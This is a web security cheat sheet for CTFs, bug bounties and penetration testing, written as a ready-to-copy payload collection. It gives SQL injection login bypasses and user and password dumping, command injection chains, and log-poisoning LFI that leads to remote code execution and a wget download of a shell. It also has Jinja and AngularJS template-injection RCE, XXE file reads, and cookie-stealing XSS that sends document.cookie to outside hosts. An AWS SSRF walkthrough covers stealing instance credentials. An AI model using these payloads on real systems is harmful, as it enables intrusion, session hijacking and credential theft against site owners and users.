# WEB SECURITY CHEATSHEET
Copy pasta these cheats for CTFs, bug bounties, penetration testing etc.

Automate your shit as much as possible because time is important + you dont have time to analyse every single request/response or do repetitive tasks.

Good cheat-sheets (if shit here doesn't work):
* https://github.com/w181496/Web-CTF-Cheatsheet

# Index

- [Security Setup](#security-setup) 
- [Common 6843 words](#common-6843-words)  
- [Recon](#recon)
- [Authentication / Session Management](#authentication.-session-management.-access-control)
- [Local / Remote File Inclusion](#local-and-remote-file-inclusion)
- [SQL Injection](#sql-injection)
- [Command Injection](#command-injection)
- [Server-Side Template Injection](#server-side-template-injection)
- [XML External Entities](#xxe)
- [Cross-Site Scripting (XSS)](#xss)
- [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery)
- [PHP Serialization](#php-serialization)
- [Amazon Web Services SSRF](#amazon-web-services-ssrf)
- [REST APIs](#rest-apis)

# Content

### ============================================================
### Security Setup
### ============================================================

**Capturing HTTP response/requests**
* Do it the hard way: launch your own server that captures header/request/response info e.g. `python -m SimpleHTPServer 80`
* https://requestbin.fullcontact.com/
* http://webhookinbox.com/

### ============================================================
### Wordlists
### ============================================================
Port Numbers, Directories, Subdomains, Files... be imaginative.
```
[REFER TO YOUR LOCAL SECTOOLS->WORDLISTS DIR]
noone
sketch / sketchy
sy
carey / cry
9447 / 6841 / 6441
robots.txt
flag
 /lol, /fuck, /1, /test, /sy
```
List of /etc/{blah} files (in case some strings are blacklisted e.g. "/etc/passwd")  
`https://www.tldp.org/LDP/sag/html/etc-fs.html`

### ============================================================
### Recon
### ============================================================

**Nslookup**
```
Reverse DNS query:
$ nslookup [ hostname/ip ]
```

**Nmap**  
```shell
# Aggressive service/OS detection:
$ nmap -sV --version-intensity 5 [ hostname/ip ]

# Scan all ports for the lolz:
$ nmap -p- [ hostname/ip ]
$ nmap -sT -vv -p 1-65535 [ hostname/ip ]

# Scan most common ports (fast):
$ nmap -F [ hostname/ip ]

# Increase Verbosity / Debugging:
$ nmap -vv OR -dd [ hostname/ip ]
```

**LEVEL 1: Aquatone / Amass**  
Aquatone: https://github.com/michenriksen/aquatone
```shell
$ aquatone-discover --domain [ ns.agency ]  # run subdomain bruteforcing
$ cat ~/aquatone/example.com/hosts.txt      # show discovered subdomains
```  
Amass: https://github.com/caffix/amass
```
$ cd /Go/amass
$ ./amass -d ns.agency
```  
GoBuster DNS Mode: https://github.com/OJ/gobuster  
```
$ go run main.go -m dns -u [ https://ns.agency ] -w ~/path/to/wordlist
```
**LEVEL 2: AltDNS (permutations, alterations and mutations of subdomains)**  
AltDNS: https://github.com/infosec-au/altdns
```
$ ./altdns.py -i [ input.txt ] -o [ output.txt ] -w [ wordlist.txt ] -r -s [ valid_subdomains.txt ]

-i input.txt  => list of known subdomains.
-o output.txt => contain list of altered/permuted subdomains that have been tested.
-r            => resolves each subdomain
-w wordlist.txt => list of words that you would like to permute your current subdomains with.
```

**Directory Bruteforcing**  
GoBuster Directory Mode: https://github.com/OJ/gobuster 
```
$ go run main.go -u https://ns.agency -w ~/path/to/wordlist
````  

### ============================================================
### General HTTP trickery
### ============================================================

Changing Content-Type:
* `Content-Type: image/png` =>  `Content-Type: text/html`

**HTTP Header Injection**  

Inject your payload into headers by replacing/concat a header value.

PHP code exec via. header injection:
```php
/* User-Agent header injection */
User-Agent: Mozilla <h1>hello world</h1>           // confirm
User-Agent: Mozilla <?php shell_exec('bin/ls');?>  // cmd injection #1
User-Agent: Mozilla <?php system('bin/ls');?>      // cmd injection #2
User-Agent: Mozilla <?php passthru('bin/ls');?>    // cmd injection #3 
```

Inject header + CRLF: Set your own cookies example
```http
// Request with Carriage-Return Line-Feed '%0d%0a'
example.org/redirect.asp?origin=foo%0d%0aSet-Cookie:%20session_name=setsessionidvalue%0d%0a

// Response
HTTP/1.1 302 Object moved
Location: account.asp?origin=foo
Set-Cookie: session_name=setsessionidvalue
Content-Length: 121
```

**HTTP response splitting => XSS**
```http
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```

### ============================================================
### Authentication. Session Management. Access Control
### ============================================================

Authentication: Is the user who they claim to be?
Session Management: Is it still that user? 
Access Control: Is the user allowed to access this thing?

Observe:
* Cookie / Session Token values.
  * Base64 decode -> change values to admin etc. -> Base64 encode -> Profit.
* Page Source Code.
  * View Source -> Look for suspicious comments / sections in code -> Profit.

Things to try:
```
admin:admin
admin:pass
admin:password
root:root
user:user
default:default
[all the above + blank password]
:     <================= BLANK USER/PASS (worked before in the past lol)
```

IDOR the shit out of things:
* Look at ID param values, cookie values, request data values etc.
* Some IDORs are harder than others:
   * Brute-force using your IDOR brute-force script.
   * Think about pattern of the IDOR value and engineer a way to brute-force more effectively, rather than 1++


### ============================================================
### Local and Remote File Inclusion
### ============================================================

**A more in-depth LFI / LFI->RCE Cheatsheet:**  
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal  
How to abuse PHP wrappers (ftp:// zip:// etc.) (RCE exploit)
* https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
* Write malicious PHP -> create .zip containing malicious PHP -> `https://target.com/param?=zip://uploads/image.png%23shell` -> `https://target.com/param?=zip://uploads/image.png%23shell&param1=system&param2=ls` => RCE 
Other things:
* Some applications may concat `.php` to the end of your URL so you may need to use `%00` null-byte injection to stop the extension appending.

**STEP #1: Verify existence of LFI/LFD vulnerability**
```http
domain.com/?p=somepage.txt
domain.com/?p=pagename-whatever
domain.com/?class=something&function=another 
```

**STEP #2: Figure out where the logfiles are. Example locations:**
* NOTE: If you can execute phpinfo(); then you can find out where access/error logs are stored on the server.
* For non-default locations, try to figure out where they install their PHP, Nginx, Apache and look in there.
```html
<!-- PHP Logfiles: -->
/usr/local/etc/php
/etc/php.d/*.ini
/etc/php5/cli/php.ini
/usr/local/lib/php.ini
/etc/php.ini
  
<!-- Apache Logfiles: -->
/var/log/apache2/access.log
/var/log/httpd/error_log
/var/log/apache2/error.log
/var/log/httpd-error.log

<!-- Other default logfile locations: -->
1. Look @ HTTP response 'Server' header to see what distribution they are using e.g. (Debian)
2. Google 'default Debian apache log directory' etc.
```

**STEP #3: Inject a payload into the logfile****

  * _PHP passthru() function_: Execute an external program and display raw output
  * Attack vectors:
     * URL query string: `example.com/?q=injectpaylod`
     * HTTP Headers: Referer header.
```php
$ <?php passthru($_GET['cmd']); ?>
$ <?php passthru(['ls -l']); ?>
```

**STEP #4: With command execution, use wget to upload your own files to the server**
```
$ /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
OR
$ <?php passthru(['w']); ?>
```

**PHP things:**
```php
/* Vulnerable php code to LFI 
 * i.e. if source code uses these functions, page is most likely exploitable.
 *      or if not, try to inject this code somewhere i.e. in HTTP headers or forms.
 */
<?php passthru('cat /flag*');?>              'successful payload in one of the challenges
<?php require('../../etc/passwd'); ?> 
<?php require_once('../../etc/passwd'); ?> 
<?php include('../../etc/passwd'); ?>
<?php include_once('../../etc/passwd'); ?> 
<?php system(base64_decode($_COOKIE[‘asjdkfljhasfd’])); ?>   // Steal cookies

/* Try these PHP wrappers
 * More: https://secure.php.net/manual/en/wrappers.php
 */
php://filter/resource=/etc/passwd    // 'resource' arg is required
php://input               // RCE exploit: http://localhost/include.php?page=php://input%00  (null byte to cut off '.php')
php://expect
php://data                // exploit: http://localhost/include.php?page=data:text/plaintext,<?php phpinfo();?>
data://text/plain;base64,
^DIRECTLY ADD PHP CODE INTO THE GET PARAM

/* Bypass WAFs by base64 encoding your phpinfo() payload */
http://localhost/include.php?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOyA/Pg==

/* READ MORE AT:
 * https://www.exploit-db.com/papers/12871/
 * https://stackoverflow.com/questions/20726247/php-security-exploit-list-content-of-remote-php-file?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
 */
```

**Windows LFI:**
```
C:/Windows/win.ini
C:/boot.ini
C:/apache/logs/access.log
../../../../../../../../../boot.ini/....................... and so on
C:/windows/system32/drivers/etc/hosts
```

**Other things to try:**
``` 
TRY OTHER PROTOCOLS:
http://, ftp:// etc.

TRY OTHER LFI METHODS:
./index.php | ././index.php | .//index.php
../../../../../../etc/passwd | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/nginx/conf.d/default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default.conf
.htaccess
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
```


### ============================================================
### XSS
### ============================================================

Attack Vectors:
* HTTP Headers: `User-Agent:`, `Referer:`, `Cookie:`
* Intentionally invalid requests: send 192.168.1.1/lol.php?<script></script> to an admin
* XSS combined with CSRF: Bypass Single-Origin-Policy with XSS (see below)

**Useful JS web API methods for XSS**  
Redirect a user/admin to your url to steal their cookies.
```javascript
fetch()
window.onload()
document.location()
window.location.replace()
window.location.reload()
window.location.assign()
```

**Standard Payloads**
```javascript
/* PoC Payloads */
<script>alert('hi')</script>
<script>alert(document.cookie)</script>

/* Filter Evasion Payloads */
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
<img src=x onerror="alert(document.cookie)">
<img src="javascript:alert('XSS');">
<img src=javascript:alert('XSS')>
<img src=javascript:alert(&quot;XSS&quot;)>
<a onmouseover="alert(document.cookie)">click me</a>
<input type="image" src="javascript:alert(document.cookie)"

/* PoC Payloads */
document.write('<img src="http://requestbin.fullcontact.com/1bpkogg1?cook='+document.cookie+'">')
```

**Other Payloads**
```javascript
<iframe src="javascript:alert(0)"> 
fetch("http://v.mewy.pw")
document.replace("XMLHttpRequest")
document.location="http://v.mewy.pw?"+document.cookie
<script>new Image().src="//v.mewy.pw?"+document.cookie</script>
<svg/onload="alert(1)"/>

// interchangeable
document['location']=
document.location=
```

**CSP Bypass**  
Bypass via. JSONP API callback param:
```javascript
//Verify:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>

//Payload Original:
<script src="target.com/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>

//Payload Step #1 => Encode x1:
<script src="target.com/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>

//Payload Step #2 => Encode x2:
<script src="target.com/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>

/* Note:
Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
*/
```

**XSS with CSRF**
Any request made by XSS is from the same origin/domain, therefore bypassing SOP (which helps prevent CSRF)
1. simply use a GET to pull the CSRF token from a form
2. make the POST to the endpoint
3. exfil the return - since SOP is bypassed!

**WAF Bypass**
Bypass a WAF by challenging assumptions.
* Null bytes
* Newlines
* Case sensitivity
* IPv6
* Content-Length header  
Consider this: WAF's are extremely complex systems defending extremely complex systems.

**JSON-based bypass**
* http://c0d3g33k.blogspot.com/2017/11/story-of-json-xss.html
* ^User-controlled input being reflected in a json-response, but value is output encoded -> convert JSON key to a JSON-array (giving you control of what goes into the key) -> escape JSON context via. manipulating the key
```
INPUT WITHOUT BYPASS: ?status=test<script>
JSON RESPONSE BEFORE BYPASS: {"success": true, "status": "test&lt;script&gt;"}

INPUT WITH ARRAY BYPASS: ?status[<img onmouseover=alert(1)>]=test
JSON RESPONSE AFTER BYPSASS: {"success": true, "status":{"<img onmouseover=alert(1)>": "test"}}
```


### ============================================================
### SQL Injection
### ============================================================
Learn SQL Injection: http://websec.fr/level01/index.php
SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/  
DB Specific SQLi Cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targetsite.com/price.php?id=1+1`

**NOTE: SQL does not have 0th index for strings. Strings start at 1 e.g. SUBSTR('hello',1,1) not SUBSTR('hello',0,1)**
**NOTE: Injection can also be via. url params rather than form input.**

**DB fingerprinting techniques:**
```sql
/* MySQL */                                                        -- FINGERPRINTING:        
   ' union select current_user, 1'
   ' union select @@version, 1'
   news.php?id=1 /*! AND 1=1 */--              -- via. comments
   news.php?id=' UNION SELECT 1, @@version--   -- via. db version
   news.php?id=' or CONCAT('a','a')='aa        -- via. MySQL CONCAT()

/* Postgres */
   http://www.example.com/news.php?id=1 AND 1=1::int               -- via. typecast
   http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          -- via. Postgres concat
   http://www.example.com/news.php? id=1
   SELECT version()                                                -- via. db version
   
/* SQL Server (Microsoft SQL Server / MSSQL) */
   http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

/* If !MySQL and !Postgres, most likely SQLite: */
   http://www.sqlitetutorial.net/sqlite-cheat-sheet   OR
   https://d17h27t6h515a5.cloudfront.net/topher/2016/September/57ed880e_sql-sqlite-commands-cheat-sheet/sql-sqlite-commands-cheat-sheet.pdf
```

**Enumerate DB metadata via. views:**
```sql
/* MySQL (db.information_schema) */
  SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
  SELECT * FROM INFORMATION_SCHEMA.TABLES;
  SELECT table_name, table_type, engine FROM information_schema.tables;
  
/* Sqlite (db.sqlite_master) */
  SELECT sql FROM sqlite_master;
  SELECT name FROM sqlite_master WHERE type='table';  -- Step #1: Access table names from 'sqlite_master' table.
  SELECT * FROM table_name LIMIT 1;                   -- Step #2: Enumerate column names from the specified table.
```

**Authentication Bypass:**
```sql
/* Auth Form Bypass Example: */
  SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
  [user_field]’ OR 1=1; /*
  [pass_field]*/--
  
/* More Auth Bypass methods */
  admin' --
  admin' #
  admin'/*
  ' or 1=1-- 
  ' or 1=1#
  ' or 1=1/*
  ' or '1'='1
  ' or '1'='1 -- 
  ') or '1'='1--
  ') or ('1'='1--
  
/* UNION bypass */
  ' UNION SELECT 1, 'admin', 'doesnt matter', 1--
```

**Comment Injection (bypass appended sql)**
```sql
[SOURCE CODE QUERY: SELECT * FROM users WHERE name='?' LIMIT 1;]
Bypass 'LIMIT 1;' with:
x' --
x' #
x' //
x' /*
```

**Blind SQLi (Boolean / Time-based)**
```sql
/* General */
%' AND 1=1 AND '%'='                  -- BOOLEAN: TRUE
%' AND 1=0 AND '%'='                  -- BOOLEAN: FALSE
company=sap%' AND SLEEP(5) AND '%'='  -- TIME-BASED   
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

/* Probes: existence of databases, values */
' OR '1'='1
' UNION SELECT 1 FROM users'
' UNION SELECT username FROM users WHERE username LIKE '%
SELECT * FROM users WHERE username='' OR '1'='1'
SELECT * FROM users WHERE username='' UNION SELECT 1 FROM users
SELECT * FROM users WHERE username='' UNION SELECT username FROM users WHERE username LIKE '%'

/* Enumerate username string */
-- Note: USER() is a MySQL function to return the current user and hostname as a string.
-- Use SUBSTR() method to enumerate other information too.
page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'a'
page.asp?id=1 and SUBSTR(USER(), 1, 1) = 'd'  -- repeat 'a','d','m','i','n'

/* Enumerate column names */
' HAVING 1=1 --
' GROUP BY table.columnfromerror1 HAVING 1=1 --
' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 -- and so on until no more errors

/* Enumerate no. of columns */
ORDER BY 1--
ORDER BY 2--
ORDER BY N--
```

**UNION SELECT (exfiltrating data):**
```sql
/* Good guide on UNION injection */
http://www.sqlinjection.net/union

/* WORKING PAYLOAD (6443 BREAK - MySQL) */
    ' union select null,null, . . . 1 from users      -- keep guessing no. of columns with select null,null,null ...
    ' union select name,priv from users where priv='admin'--
    ' union all select @@version, 1'
    ' union all select current_user, 1'

/* Dump db version + db name */
    ns.agency/stuff.php?id=3 order by 1                                  
    ns.agency/stuff.php?id=0' union select 1,version(),database()-- 
    
/* Dump usernames and passwords (MySQL) */
    -- list names of tables within the current database [result=emails, referers, uagents, users]
    ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()-- 
    -- list names of columns within the "users" table [result=id, username, password]
    ns.agency/stuff.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name="users"-- 
    -- list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
    ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users-- 
```

**INSERT / UPDATE (adding or changing data):**
```sql
/* Insert new users (MySQL) */
    -- insert a new row into the "users" table with values id=99, username=newuser, password=newpass
    ns.agency/stuff.php?id=0'; insert into users(id,username,password) values ('99','newuser','newpass');-- 

/* Update admin password (MySQL) */
    -- set password="1234" for a user called "admin"
    ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";-- 
```

**LIKE %_ (sql wildcard matching)**
```sql
[where id=']' or user like 'a%   -- matching a user that starts with 'a'
[where id=']' or password like '1%   -- matching a password that starts with '1'
```

**MySQL String Manipulation Trickery:**
```
Mid(version(),1,1)
Substr(version(),1,1)    => 1' or substr('a',1,1)='a  [ working payload ]
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)
```

**Sqlmap:**
```shell
# Enumerate everything:
python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3

# Enumerate a specific database:
python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
```

**Other things:**
```sql
/* Read Files (MySQL) */
   SELECT LOAD_FILE('/etc/passwd');

/* Load data into table (doesn't work on SQLite): */
   LOAD DATA INFILE 'data.txt' INTO TABLE db.my_table;

/* Exfiltrate data into a file: */
   SELECT * FROM 'db.my_table' INTO OUTFILE 'data.txt'  -- exfiltrate data into data.txt
   show variables like 'datadir';                       -- check for the file in MySQL data directory 'datadir'

/* Logic Altneratives (bypass filters etc.) */
   and -> &&
   or -> ||
   = -> like
   != -> not like
   
/* NULL byte (%00) injection */
   /sqli?id=1%00%22union%20select%20flag%20from%20flag;-- 
=> /sqli?id=1%00"union select flag from flag;-- 
```

### ============================================================
### Command Injection
### ============================================================

**Command Injection**
Examples:
```http
http://shitesite/lol.php?path=cat%20/etc/passwd
http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
```  

**Injection via. chaining:**
```shell
{original_cmd_by_server}; cat flag
{original_cmd_by_server} && cat flag
{original_cmd_by_server} | cat flag
{original_cmd_by_server} || cat flag    // Only if the first cmd fail
{original_cmd_by_server} %0a cat flag
{original_cmd_by_server} "; cat flag
{original_cmd_by_server} `cat flag`
{original_cmd_by_server} cat $(ls)
{original_cmd_by_server} "; cat $(ls)
```  

**Execution inside another command:  **
```shell
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```  

### ============================================================
### Server Side Template Injection
### ============================================================

SSTI Exploit Tool: https://github.com/epinna/tplmap

**READ SOME SSTI writeups:**
* https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
* https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
* https://meem67.github.io/blog/2017-02-16/BSidesSF_writeups.html#Zumbo1 
* https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo1
* https://hackerone.com/reports/125980

**Flask template injection:** 
```jinja
{{4+4}}
/* Request object:
 * Gives you request context: {{request.__dict__}} which tells you everything about your request.
 * This is 'server-side disclosure of info' which is a vuln category itself.
 * Can be used to bypass 'http-only' or 'secure-marked' cookies, which can't be disclosed via. Javascript. 
 */
{{request}}  

/* Config object:
 * Flask-specific config object.
 * Look for 'SECRET_KEY' which is a key used to encode your Flask cookie.
 */
{{config}}
```

**Flask template injection walkthrough:**
* Use Python method of navigating through classes and objects.
* Every object has a special method '__class__' letting you access the 'class' object.
* __mro__ lets you traverse up the class tree, then look down the subclasses.

1. Get a list of the available methods within the Python object:
   * `''.__class__.__mro__.[1]__dict__`
   * Construct a string '' and call 'class' on it => get the Python 'str' class itself
   * Call '__mro__' to get the parent class 'object' i.e. (<class 'str'>, <class 'object'>)
   * Access index [1] i.e. the 'object' class
   * See what is in the object itself with __dict__ i.e. a whole bunch of the object's methods.

2. Hunt for a class within the available output list that can be used to exploit:
   * `[].__class__.__base__.__subclasses()__` => dump all the classes within the Python context.
   * Copy/Paste output list to sublime.
   * Replace `,` with `,\n` to see the list of classes + associated index numbers.
   * Find a suitable class and then access the class by indexing into it: e.g. `<class 'os'>` = index 162
   
3. Use the targeted class to exploit the vulnerability:
   * `[].__class__.__base__.__subclasses__()[162]` to target the OS class (or target `import` class to `import OS`)
   * Once `OS` class is available, execute system command:
   * `__init__.__globals['__builtins__']['exec']("import os; os.system('/bin/ls')")}}`
   * ^or something similar lol fuck this looks so tedious.


**Other Flask/Jinja template injection stuff:**
```jinja
# Dump all used classes
  {{ ''.__class__.__mro__[2].__subclasses__() }}
# Read File
  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
# Write File
  {{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}
# RCE
  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
# evil config
  {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
# load config
  {{ config['RUNCMD']('cat flag',shell=True) }}
```

**Working AngularJS payload (EXT BREAK #2):**
```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=5+5,new Image().src="http://requestbin.fullcontact.com/1b17hka1?asdf="+document.cookie,alert(2)');}}
```

**Angular JS:**
```javascript
{{ 7*7 }} => 49
{{ this }}
{{ this.toString() }}
{{ constructor.toString() }}
{{ constructor.constructor('alert(1)')() }} 2.1 v1.0.1-v1.1.5
{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }} 2.1 v1.0.1-v1.1.5
{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) }} 2.3 v1.2.19-v1.2.23
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}} v1.2.24-v1.2.29
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} v1.3.20
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} v1.4.0-v1.4.9
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} v1.5.0-v1.5.8
{{ [].pop.constructor('alert(1)')() }} 2.8 v1.6.0-1.6.6
```

### ============================================================
### XXE
### ============================================================

**XXE standard:**
* NOTE: "FILe" upper/lowercase mix was to bypass firewalls
* Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
        <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
]>
<element>&xxe;</element>
```

More Payloads:
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
```

**XXE Out-of-Bounds attack:**
```

```

**XML Parser/Filter Bypass:**  
_Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs included_
```

```

### ============================================================
### Other Server-Side Magic
### ============================================================

File Upload Exploits:
* Read: https://hackerone.com/reports/135072 (RCE in profile pic upload)
* Read: https://imagetragick.com/ (Imagemagick vulns)
* Change file extensions
* `cat exploit.php lol.png > lolv2.png`
* Check authorisation / authentication:
   * Upload requires admin
   * Upload API endpoint is unauthenticated
* Look for outdated plugins


### ============================================================
### Cross-Site Request Forgery
### ============================================================

CSRF: where an attacker uses a victim's session to perform a malicious request on an application which they're currently authenticated in.
* CSRF is used for state-changing requests rather than theft of data. i.e. request to change admin email address.
* Possible when there is no validation of the **origin of the request**
* Common places to look for CSRF: Account settings / pages with admin privileges.

CSRF steps:
1. Victim: POST /changepwd.php
2. Server: 200 OK
3. Attacker: attack.com/changepwd.html
     => trick victim into submitting form
     => forged POST/changepwd request is made from attack.com origin.
4. [STAGE CHANGE]: password is now changed to '1234'
5. Attacker: Login with password '1234'


### ============================================================
### Server-Side Request Forgery
### ============================================================
Summary: Attacker can make requests from a server to target a system's internals (i.e intranet) by bypassing its firewalls.

**SSRF indicators:**
* Look for network requests that may reference a localhost address: `https://ns.agency/static?r=http://127.0.0.1:[port]/flag.html` (inspect->network)
* Callback functions.
* Look for params that may reference internal services.
* Look for a search input box / any form input that may reference internal services.
* Look for redirects

**File Protocol (access a server's file system)**
```http
file:///etc/passwd
file:///proc/self/cmdline
file:///proc/self/exe
file:///proc/self/environ
curl file:///etc/passwd
```

**Other Protocols**
```http
gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
gopher://127.0.0.1:9000                 // FastCGI
gopher://127.0.0.1:6379                 // Redis
ftp://127.0.0.1:20/21
dict://
telnet://127.0.0.1:23
smtp://127.0.0.1:25
jar://
```

**Elastic Search APIs (default port:9200/9300):**
```http
http://0:9200/_search?q={flag, sectalks, 6443 . . .}
http://0:9200/_cluster/settings
http://0:9200/_cluster/state
http://0:9200/_tasks/
http://0:9200/_nodes?pretty=true
http://0:9200/_mapping
http://0:9200/_cat&?pretty=true
http://0:9200/phrack/article/14
```

**PHP:**
```php
file_get_contents()
fsockopen()
curl_exec()
```

**Bypass 'localhost' filters:**
```http
http://{localhost_variation}
127.0.0.1
192.168.1.1
Localhost
lOcAlHoSt
0
http://0177.1/
http://0x7f.1/
http://127.000.000.1
```

**CRLF injection in HTTP header**
```
Carriage Return (\r) or Line Feed (\n) terminates a line of HTTP request.

// Attacker's request:
GET ?url=http://example.com/%0d%0aReferer:localhost
Host:www.target.com

// Server's request
GET http://example.com
Referer:localhost
```

**SSRF Query Bypass**   
Default State
```http
// ACCEPTED REQUEST
// Allowed because "yimg.com" is in the string i.e. server only checks for the string
GET /iu/?u=http://yimg.com
Host: duckduckgo.com

// REJECTED REQUEST //
// Rejected because "yimg.com" doesn't exist in the string.
GET /iu/?u=http://google.com
Host: duckduckgo.com
```

SSRF with query bypass
```http
// REQUEST
GET /iu/?u=http://127.0.0.1:6868%2fstatus%2f?q=http://yimg.com

// RESPONSE
{
  "current_time": "2018-08-23T17:56:06",
  "deployment_environment": "prod",
  "redis_local_last_successful_ping": "2018-08-23T13:56:05",
  "redis_local_url": "redis://127.0.0.1:6380",
  "redis_regional_last_successful_ping": "2018-08-23T13:56:05",
  "redis_regional_url": "redis://cache-services.duckduckgo.com:6380",
  "stat_blocked_ips_removed_since_launch": 8787,
  "stat_blocked_ips_since_launch": 12185,
  "stat_ipset_blocks": 266,
  "stat_redis_local_messages_received": 3613,
  "stat_redis_regional_messages_received": 10211,
  "status": "up"
}
```

### ============================================================
### Amazon Web Services SSRF
### ============================================================

Confirm SSRF with `http://169.254.169.254` as the payload.

**Typical Steps:**
1. Find info / dump data in AWS instance.
```http
http://169.254.169.254/latest/meta-data/iam/info   // Find an IAM role with access to the AWS resources.
http://169.254.169.254/latest/user-data
```
2. Find AWS Access Keys.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/{EC2_instance_role}

Info retrieved should contain:
    * AccessKeyId: { access key ID }
    * SecretAccessKey: { secret access key }
    * Token { session token }
    * Expiration { expiry information }
```
4. Go to `~/.aws/credentials` and add in:
```
aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
aws_session_token = {really long access token string}

You can also configure AWS keys via:
$ aws configure
```

5. Enumerate s3 bucket content: `aws s3 ls s3://ns.agency`  

6. Dump a flag or file content to stdout or download it
```
$ aws s3 cp s3://ns.agency/flag -    // dump to stdout
$ aws s3 cp s3://ns.agency/flag .    // download to current working dir
```

**Alternatively, leak AWS Access Keys via. Local File Disclosure or similar vuln:**
```
LFD => $ /docker-entrypoint.sh /init.sh ~/.aws/credentials.json
    OR $ cat ~/.aws/credentials
```

More info on AWS testing: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3  
More info on exploiting AWS post-compromise: https://danielgrzelak.com/exploring-an-aws-account-after-pwning-it-ff629c2aae39


### ============================================================
### PHP Serialisation
### ============================================================

**PHP Magic Methods:**
* `construct()`: Object is called when new, but unserialize() is not called
* `destruct()`: Called when the Object is destroyed
* `wakeup()`: Called automatically when unserialize
* `sleep()`: Called when serialize
* `toString()`: When the object is called as a string

### ============================================================
### REST APIs
### ============================================================

**Common Findings / Things to look out for:**

Cookie / Session Token:
* Decode base64, may reveal sensitive information
* Check token expiry, token re-use, predictability.

Insecure Direct Object Referencing
* Changing ID / param values in the request to access/change/delete unintended resources.
* E.g. FB API vulnerability: `DELETE /<commend id>` to remove any user's comments.

Check for Privilege Escalation:
* Check Access Controls DELETE / PUT methods.

SQL injection / XSS
* Injection queries/javascript into requests to API endpoints.

Test request/response media types:
